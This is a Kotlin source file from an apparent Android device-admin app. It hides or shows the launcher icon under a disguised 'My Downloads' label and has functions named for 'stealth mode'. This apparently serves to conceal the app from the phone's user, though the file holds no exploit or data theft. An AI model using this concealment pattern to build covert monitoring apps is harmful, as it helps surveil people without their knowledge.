package com.example.deviceadmin

import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import android.util.Log

object AppIconManager {
    
    // This is the permanent alias "My Downloads"
    private const val MAIN_ALIAS = "com.example.deviceadmin.MainActivityAlias"
    
    // Only used for Android < 11 where logic allows hiding
    fun hideAppIcon(context: Context) {
        Log.i("AppIconManager", "Hiding App Icon (Disabling Component)")
        setIconState(context, MAIN_ALIAS, PackageManager.COMPONENT_ENABLED_STATE_DISABLED)
    }
    
    // Used to show setup or unhide
    fun showAppIcon(context: Context) {
        Log.i("AppIconManager", "Showing App Icon (Enabling Component)")
        setIconState(context, MAIN_ALIAS, PackageManager.COMPONENT_ENABLED_STATE_ENABLED)
    }
    
    // Compatibility helpers for workers
    fun switchToStealthMode(context: Context) {
        // On Android 11+, "Stealth Mode" IS the default enabled state "My Downloads"
        // On Android < 11, we might hide it. Logic handled by caller or here?
        // Let's safe-guard: ensure it is ENABLED so user can click "My Downloads"
        // Unless specific "Hide" request came from Setup.
        // For now, ensure Enabled.
        showAppIcon(context)
    }

    fun switchToSetupMode(context: Context) {
        showAppIcon(context)
    }
    
    // Check if component is disabled
    fun isIconHidden(context: Context): Boolean {
        val pm = context.packageManager
        val componentName = ComponentName(context, MAIN_ALIAS)
        return try {
            val state = pm.getComponentEnabledSetting(componentName)
            state == PackageManager.COMPONENT_ENABLED_STATE_DISABLED
        } catch (e: Exception) {
            false
        }
    }
    
    // We can no longer distinguish "Stealth" vs "Setup" by Alias, 
    // because they are the SAME alias.
    // Logic must be handled by Permission Check in MainActivity.
    fun isStealthModeActive(context: Context): Boolean {
        // We assume stealth mode is active if the icon is NOT hidden
        // validation is done via permissions in MainActivity
        return !isIconHidden(context)
    }
    
    private fun setIconState(context: Context, aliasName: String, state: Int) {
        val pm = context.packageManager
        val componentName = ComponentName(context, aliasName)
        
        try {
            pm.setComponentEnabledSetting(
                componentName,
                state,
                0
            ) 
        } catch (e: Exception) {
            Log.e("AppIconManager", "Failed to set icon state", e)
        }
    }
}
